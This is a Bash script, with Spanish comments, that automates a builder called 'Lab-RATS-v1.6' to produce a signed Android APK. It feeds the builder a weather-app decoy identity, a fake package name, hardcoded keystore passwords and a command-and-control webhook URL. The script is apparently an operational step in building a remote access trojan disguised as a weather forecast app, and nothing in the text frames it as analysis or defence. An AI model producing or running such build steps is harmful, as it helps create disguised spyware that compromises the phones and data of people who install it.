#!/bin/bash

# Script para compilar APK con configuración Weather
# Credenciales desde /home/patrokojane/Vídeos/patito/credenciales.txt

cd /home/patrokojane/Vídeos/el-pato/Lab-RATS-v1.6/apk-builder

export ANDROID_HOME=$HOME/Android/sdk
export ANDROID_SDK_ROOT=$ANDROID_HOME
export PATH=$PATH:$ANDROID_HOME/cmdline-tools/latest/bin:$ANDROID_HOME/platform-tools

echo "=========================================="
echo "Iniciando build de APK Weather Forecast"
echo "=========================================="
echo ""

# Ejecutar build.sh con respuestas automáticas
{
    echo "1"           # Start Build
    echo "y"           # Generate new keystore
    echo "weather"     # Key alias
    echo "clima2020"   # Keystore password
    echo "clima2020"   # Key password
    echo "Weather Forecast"  # App Name
    echo "com.weather.forecast.pro"  # Package ID
    echo ""            # Version Name (default)
    echo "23"          # Min SDK
    echo "3"           # Decoy Identity (Weather)
    echo "https://lab-rats-v1-6-21za.onrender.com"  # C2 Webhook URL
} | ./build.sh

echo ""
echo "=========================================="
echo "Build completado"
echo "=========================================="

# Verificar si el APK se creó
if [ -f "output/signed_v1.apk" ]; then
    echo "✓ APK creado exitosamente"
    echo "Ubicación: /home/patrokojane/Vídeos/el-pato/Lab-RATS-v1.6/apk-builder/output/signed_v1.apk"
    ls -lh output/signed_v1.apk
else
    echo "✗ APK NO se creó. Verificar errores arriba."
fi
